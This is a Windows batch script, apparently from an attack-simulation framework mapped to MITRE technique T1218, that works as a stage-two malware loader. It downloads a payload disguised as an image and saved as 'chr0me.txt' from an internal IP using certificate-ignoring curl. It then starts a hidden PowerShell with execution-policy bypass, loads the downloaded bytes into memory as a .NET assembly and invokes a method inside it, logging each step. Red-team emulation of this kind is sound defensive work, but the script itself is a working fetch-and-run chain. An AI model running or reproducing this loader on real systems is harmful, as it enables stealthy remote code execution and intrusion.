@echo off
setlocal enabledelayedexpansion

REM SET-var preamble: declare random-named SET vars for every PHR placeholder
SET abcd=ITZEL-S2B
SET efgh=10314
SET ijkl=7
SET mnop=%APPDATA%\10314\9a201064
SET qrst=chr0me.txt
SET uvwx=https://10.0.0.49/stage/2/icon.png?10314-7
SET yzab=%APPDATA%\7\macula-simulations.log
SET cdef=%APPDATA%\7
SET ghij=Microsoft.Win32.TaskScheduler.NativeBridge
SET klmn=Dale
SET opqr=https://10.0.0.49

REM Timestamp helper
for /f "tokens=1-6 delims=/:. " %%a in ("%date% %time%") do set tsvar=%%a-%%b-%%c_%%d:%%e:%%f

REM Heartbeat fetch (downloads Stage 2 Loader)
echo [!tsvar!][DEBUG][!abcd!][!efgh!]: heartbeat_start >> "%APPDATA%\!ijkl!\macula-simulations.log"
curl -k -s -o "!mnop!\!qrst!" "!uvwx!"
echo [!tsvar!][DEBUG][!abcd!][!efgh!]: heartbeat_complete >> "%APPDATA%\!ijkl!\macula-simulations.log"

REM Change directory to output location
cd /d "!mnop!"
echo [!tsvar!][DEBUG][!abcd!][!efgh!]: chdir_result=!errorlevel! >> "%APPDATA%\!ijkl!\macula-simulations.log"

REM LOLBIN invocation (PowerShell .NET assembly load)
echo [!tsvar!][DEBUG][!abcd!][!efgh!]: lolbin_start >> "%APPDATA%\!ijkl!\macula-simulations.log"
powershell.exe -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('%APPDATA%\10314\9a201064\chr0me.txt')).GetType('Microsoft.Win32.TaskScheduler.NativeBridge').GetMethod('Dale').Invoke($null, $null) }"
set LERR=!errorlevel!
echo [!tsvar!][DEBUG][!abcd!][!efgh!]: lolbin_end=!LERR! >> "%APPDATA%\!ijkl!\macula-simulations.log"

REM TTP completion log for T1218 System Binary Proxy Execution
if !LERR! equ 0 (
    echo [!tsvar!][TTP][!abcd!][!efgh!]: T1218|System Binary Proxy Execution=[OK]:[] >> "%APPDATA%\!ijkl!\macula-simulations.log" 2>nul
) else (
    echo [!tsvar!][TTP][!abcd!][!efgh!]: T1218|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed] >> "%APPDATA%\!ijkl!\macula-simulations.log" 2>nul
)

endlocal